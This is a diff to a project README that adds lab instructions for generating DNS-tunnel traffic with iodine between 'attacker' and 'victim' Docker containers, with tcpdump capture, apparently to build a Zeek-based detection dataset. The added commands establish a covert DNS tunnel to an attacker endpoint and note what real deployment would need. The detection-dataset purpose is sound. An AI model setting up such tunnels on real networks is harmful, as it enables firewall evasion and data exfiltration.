@@ -857,6 +857,46 @@ data/raw/
 
 Benign traffic should also be generated for the benign dataset.
 
+### DNS Tunnel Lab Workflow
+
+The DNS-tunnel scenario uses iodine in the isolated Docker lab. The attacker
+container (`10.10.0.2`) runs `iodined`; the victim container (`10.10.0.3`)
+runs the iodine client. Both containers need `/dev/net/tun`.
+
+The validated lab parameters are:
+
+```text
+domain: tunnel.lab
+password: test
+tunnel-side server address: 192.168.99.1
+final victim capture: /pcaps/dns_tunnel.pcap
+```
+
+Run these commands in separate terminal sessions:
+
+```bash
+# Attacker (10.10.0.2)
+iodined -f -P test 192.168.99.1 tunnel.lab
+
+# Victim (10.10.0.3), start capture before the client
+tcpdump -i eth0 -U -w /pcaps/dns_tunnel.pcap
+
+# Victim (10.10.0.3)
+iodine -f -P test 10.10.0.2 tunnel.lab
+```
+
+Use `python attacker/scripts/dns_tunnel.py --help` to print the same workflow
+with configurable server, domain, password, tunnel-side address, and capture
+path. The final capture is an authentic iodine session: direct client-to-server
+operation exposes initial DNS negotiation and may then use raw UDP transport.
+The `-r` DNS-forced experiment did not complete query-type autodetection and is
+not the final workflow.
+
+This hackathon lab simulates the authoritative DNS relationship within its
+isolated Docker network. A real deployment would require DNS delegation of the
+tunnel domain to the `iodined` endpoint; no public DNS delegation exists in
+this lab.
+
 ### 5. Process traffic with Zeek
 
 Run Zeek against the captured traffic and produce the required logs.
